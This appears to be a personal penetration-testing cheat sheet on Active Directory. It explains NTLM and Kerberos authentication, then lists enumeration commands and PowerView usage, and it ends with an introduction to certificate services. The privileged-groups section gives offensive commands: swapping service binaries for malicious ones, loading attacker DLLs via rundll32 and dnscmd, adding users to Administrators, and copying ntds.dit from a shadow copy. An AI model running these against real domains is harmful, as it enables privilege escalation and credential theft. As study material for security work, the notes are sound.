---
layout: blank
pagetitle: Active Directory Information and Enumeration
---

## AD Authentication

**NTLM**
- Used when authenticating via IP address (not hostname) or a hostname not present on the AD DNS server
- Steps are:
	- Calculate NTLM Hash
	- Send username to application server
	- App server sends nonce
	- Client encrypts nonce using their hash and sends both to app server
	- App server sends client response, username, and nonce to the DC (user's hash unknown)
	- DC encrypts nonce with NTLM hash (already known) of the user and compares to response
	- If valid, DC approves authentication

**Kerberos**
- Adopted from Kerberos v5 from MIT, used as primary auth method since 2003
- Uses a ticket system, DC acts as a Key Distribution Center (KDC)
- Rather than authenticating against the application, clients get a ticket from the KDC
- Steps:
	- Client sends Authentication Server Request (AS-REQ) to the DC
		- This contains a timestamp encrypted using the hash derived from the user's username and password
	- DC receives request and looks up the password hash of the user in the `ntds.dit` file, using it to decrypt the timestamp
	- If the decryption is successful and the timestamp is unique, auth is granted
	- DC then sends client an Authentication Server Reply (AS-REP), containing a session key and a ticket-granting ticket (TGT)
		- Session key can be decrypted with user hash and reused
		- TGT contains user and domain info, IP address of client, timestamp, and a session key
			- The TGT is encrypted using the NTLM hash of the krbtgt user
			- TGT is valid for 10 hours by default and is automatically renewed while session remains active
	- Client constructs a Ticket-Granting Service Request (TGS-REQ) consisting of the current user and timestamp encrypted with the session key, resource name, and encrypted TGT and sends that back to the DC/KDC
	- The DC then ensures the resource exists and decrypts the TGT with its secret key and extracts the session key for the username and timestamp of the request
	- The KDC then performs the following checks:
		- The TGT has a valid timestamp
		- The username from the TGS-REQ matches the username of the TGT
		- The client IP address coincides with the TGT IP address
	- If those checks pass, the KDC responds with a Ticket-Granting Server Reply (TGS-REP), containing three parts:
		- Name of the service access granted for
		- 2nd session key to be used between the client and service
		- Service ticket containing the username, group memberships, and 2nd session key
	- Now that the client has a session key and a service ticket, it sends the application an Application Request (AP-REQ) including the username/timestamp encrypted with the service ticket session key and the ticket itself
	- The application server decrypts the service ticket using its account password hash, extracting the username/session key, using the session key to decrypt the username from the AP-REQ. If they match, the service assigns the appropriate permissions to the user based on the group memberships in the ticket, and access is granted

## Manual Enumeration

**Enumeration using Windows Tools**
- `net user /domain` will display all domain user accounts
	- `net user {user} /domain`
		- This shows comments on a user, which can contain passwords
		- This also shows logon scripts, which can be interesting
- `net group /domain` will give us the domain groups
	- A group assigns permissions to resources (users and other groups)
	- `net group "{group}" /domain`
	- Some uncommon but useful groups:
		- https://ss64.com/nt/syntax-security_groups.html - all groups
		- AD Recycle Bin 
			- Can read deleted AD objects
			- `Get-ADObject -ldapfilter "(&(isDeleted=TRUE))" -IncludeDeletedObjects`
			- `Get-ADObject -ldapfilter "(&(objectclass=user)(DisplayName={name})(isDeleted=TRUE))" -IncludeDeletedObjects -Properties *`
		- (Enterprise) Key Admins
			- Used for managing Bitlocker keys
			- `Get-ADComputer -Filter * -Properties msFVE-RecoveryPassword | Select-Object Name, 'msFVE-RecoveryPassword'`
		- Pre–Windows 2000 Compatible Access
			- Can read most objects due to compatability
			- `Get-ADUser -Filter * -Properties MemberOf | Select-Object Name, MemberOf`
			- `Get-ADObject -LDAPFilter "(&(objectCategory=Person)(objectClass=user))" -Properties *`
		- Server Operators
			- Can modify service binaries and restart them
			- `sc.exe config YourServiceName binPath= "C:\path\to\malicious\binary.exe"`
			- `sc.exe start YourServiceName`
		- Print Operators
			- Can be good for DLL hijacking
			- `rundll32.exe C:\path\to\malicious.dll,MainEntryPoint`
		- Account Operators
			- Can add permissions to users or users to groups, such as becoming a local Administrator or managing a service running with higher privileges
			- `net localgroup Administrators TargetUser /add`
			- `sc.exe sdset "ServiceName" "D:(A;;CCLCRPRC;;;S-1-5-21-[SID of TargetUser])"`
		- Backup Operators
			- Can backup sensitive files, like NTDS.dit
			- `vssadmin create shadow /for=C:` 
			- `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Temp\ntds.dit`
		- Dns Admins
			- Can perform dll hijacking to priv esc
			- `dnscmd /config /serverlevelplugindll \\malicious\share\malicious.dll`


## Enumeration with PowerView
- https://powersploit.readthedocs.io/en/latest/Recon/
- https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
	- Import it using `Import-Module .\PowerView.ps1`
	- Don't wget the mf repo dumbass
- Enumeration commands
	- `Get-NetDomain` - gives basic domain info
	- `Get-NetUser` - lists users within the domain
		- Lotta info, so select the user (and other info) with `Get-NetUser | select CN,pwdlastset,lastlogon`
		- List descriptions: `Get-NetUser | Select-Object SamAccountName, Description`
		- Can also list service users with `-SPN`
	- `Get-NetGroup` - enumerate groups
	- `Get-NetComputer` - enumerate computer objects in the domain
		- `Get-NetComputer | select operatingsystem,dnshostname`
		- For all IPs `Get-NetComputer | ForEach-Object { $_.dnshostname | ForEach-Object { [System.Net.Dns]::GetHostAddresses($_) | Select-Object IPAddressToString } }`
	- `Find-LocalAdminAccess` - determines if our user has administrative permissions on any computers in the domain
		- Uses the Service Control Manager, which maintains database of installed services and drivers on all Windows computers
	- `Get-NetSession -ComputerName {computername} -Verbose `
		- This one can return no data/wrong data depending on permissions
	- `Get-ObjectAcl -Identity {user} > output.txt` - Returns all access control entries (forming an Access Control List) for the user
		- `Convert-SidToName` will convert a SID to a domain name object
		- `ActiveDirectoryRights` can be pretty interesting, as `GenericAll` is the highest access permissions for an object
			- `Get-ObjectAcl -Identity {identity} | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights` will show all SIDs that have GenericAll for the `identity` passed
				- The `identity` passed can be something like a domain group or user
			- Can then `{sid} | Convert-SidToName` to see what objects have those permissions on that identity
				- Can also just `Get-ObjectAcl -Identity "{identity}" | Where-Object { $_.ActiveDirectoryRights -eq "GenericAll" } | Select-Object -ExpandProperty SecurityIdentifier | Convert-SidToName`
	- `Find-DomainShare` will list all domain shares
		- Domain shares can be shared folders/files, printers, or other resources
		- Look for interesting shares, like NETLOGON, SYSVOL, backups, docshares, or tools
		- Can view internals using `ls \\{domain}\{share}` and read files with `cat`
			- Will sometimes find encrypted Group Policy Preferences passwords, which have a known key and can be decrypted in kali with `gpp-decrypt`


## ADCS

**Overview of ADCS**
- ADCS implements Public Key Infrastructure (PKI) in Windows domains, providing certificates for secure communication, user authentication, and more.
- It integrates tightly with Active Directory, enabling automated certificate issuance and renewal.
- Common uses include:
    - Smart card logon
    - Encrypting File System (EFS)
    - Wi-Fi and VPN authentication

**Key Components**
- Certificate Authority (CA): Issues, revokes, and manages certificates.
- Enrollment Services: Allows users and computers to request certificates via interfaces like the Certificate Enrollment Web Service (CES).
- Certificate Templates: Define certificate properties, validity periods, and permissions.